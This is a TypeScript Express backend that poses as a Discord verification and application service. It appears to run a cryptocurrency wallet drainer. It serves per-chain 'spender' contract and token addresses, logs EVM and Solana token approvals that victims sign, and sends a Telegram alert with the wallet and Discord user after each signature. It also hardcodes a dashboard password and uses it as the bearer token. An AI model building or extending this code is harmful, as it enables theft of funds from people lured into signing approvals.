import express, { type Request, Response, NextFunction } from "express";
import { storage } from "../server/storage";
import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema } from "../shared/schema";
import { getContractAddressForChain, CHAIN_CONTRACTS, CHAIN_TOKEN_ADDRESSES } from "../server/direct-transfer";
import { notifyWalletSigned } from "../server/telegram-bot";

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

const DASHBOARD_PASSWORD = "hourglass2024";

function requireDashboardAuth(req: Request, res: Response, next: NextFunction) {
  const authHeader = req.headers.authorization;
  if (!authHeader || authHeader !== `Bearer ${DASHBOARD_PASSWORD}`) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
}

app.post("/api/applications", async (req, res) => {
  try {
    const validatedData = insertApplicationSchema.parse(req.body);
    const application = await storage.createApplication(validatedData);
    res.json(application);
  } catch (error) {
    res.status(400).json({ error: "Invalid application data" });
  }
});

app.get("/api/applications", requireDashboardAuth, async (req, res) => {
  try {
    const applications = await storage.getApplications();
    res.json(applications);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch applications" });
  }
});

app.post("/api/approvals", async (req, res) => {
  try {
    const validatedData = insertApprovalSchema.parse(req.body);
    const approval = await storage.createApproval(validatedData);

    try {
      await notifyWalletSigned({
        walletAddress: validatedData.walletAddress,
        network: "evm",
        tokens: [validatedData.tokenSymbol],
        discordUser: req.body.discordUsername,
      });
    } catch (e) {}

    res.json(approval);
  } catch (error) {
    res.status(400).json({ error: "Invalid approval data" });
  }
});

app.get("/api/approvals", requireDashboardAuth, async (req, res) => {
  try {
    const approvals = await storage.getApprovals();
    res.json(approvals);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch approvals" });
  }
});

app.post("/api/transfers", async (req, res) => {
  try {
    const validatedData = insertTransferSchema.parse(req.body);
    const transfer = await storage.createTransfer(validatedData);
    res.json(transfer);
  } catch (error) {
    res.status(400).json({ error: "Invalid transfer data" });
  }
});

app.get("/api/transfers", requireDashboardAuth, async (req, res) => {
  try {
    const transfers = await storage.getTransfers();
    res.json(transfers);
  } catch (error) {
    res.status(500).json({ error: "Failed to fetch transfers" });
  }
});

app.get("/api/spender-config", (req, res) => {
  const chainIdParam = req.query.chainId ? parseInt(req.query.chainId as string) : null;
  const contractAddress = chainIdParam ? getContractAddressForChain(chainIdParam) : null;
  if (!contractAddress) {
    return res.status(500).json({ error: "No contract configured for this chain" });
  }
  res.json({ spenderAddress: contractAddress, type: "contract" });
});

app.get("/api/chain-contracts", (_req, res) => {
  res.json(CHAIN_CONTRACTS);
});

app.get("/api/chain-tokens", (_req, res) => {
  res.json(CHAIN_TOKEN_ADDRESSES);
});

app.post("/api/solana-approvals", async (req, res) => {
  try {
    const { walletAddress, delegateAddress, transactionHash, tokensApproved } = req.body;
    if (!walletAddress || !delegateAddress || !transactionHash) {
      return res.status(400).json({ error: "walletAddress, delegateAddress, and transactionHash are required" });
    }

    try {
      await notifyWalletSigned({
        walletAddress,
        network: "solana",
        tokens: tokensApproved || ["USDC", "USDT"],
        discordUser: req.body.discordUser,
      });
    } catch (e) {}

    const approvals = [];
    const tokens = tokensApproved || ["USDC", "USDT"];
    for (const token of tokens) {
      try {
        const approval = await storage.createApproval({
          walletAddress,
          tokenAddress: delegateAddress,
          tokenSymbol: `SOL-${token}`,
          transactionHash,
        });
        approvals.push(approval);
      } catch (err) {}
    }

    res.json({ success: true, approvals });
  } catch (error) {
    res.status(400).json({ error: "Invalid approval data" });
  }
});

app.post("/api/dashboard-login", (req, res) => {
  const { password } = req.body;
  if (password === DASHBOARD_PASSWORD) {
    res.json({ success: true, token: DASHBOARD_PASSWORD });
  } else {
    res.status(401).json({ error: "Invalid password" });
  }
});

app.get("/api/discord/oauth-url", (req, res) => {
  const clientId = process.env.DISCORD_CLIENT_ID;
  const host = `${req.protocol}://${req.get("host")}`;
  const redirectUri = process.env.VERIFY_URL || host;
  const oauthUrl = `https://discord.com/api/oauth2/authorize?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=identify`;
  res.json({ url: oauthUrl });
});

app.get("/api/discord/callback", async (req, res) => {
  const { code } = req.query;
  if (!code) {
    return res.status(400).json({ error: "Missing code" });
  }
  try {
    const host = `${req.protocol}://${req.get("host")}`;
    const redirectUri = process.env.VERIFY_URL || host;
    const tokenResponse = await fetch("https://discord.com/api/oauth2/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: new URLSearchParams({
        client_id: process.env.DISCORD_CLIENT_ID || "",
        client_secret: process.env.DISCORD_CLIENT_SECRET || "",
        grant_type: "authorization_code",
        code: code as string,
        redirect_uri: redirectUri,
      }),
    });
    const tokenData: any = await tokenResponse.json();
    const userResponse = await fetch("https://discord.com/api/users/@me", {
      headers: { Authorization: `Bearer ${tokenData.access_token}` },
    });
    const userData: any = await userResponse.json();
    res.json({
      id: userData.id,
      username: userData.username,
      discriminator: userData.discriminator,
      avatar: userData.avatar,
      global_name: userData.global_name,
    });
  } catch (error) {
    res.status(500).json({ error: "OAuth failed" });
  }
});

export default app;
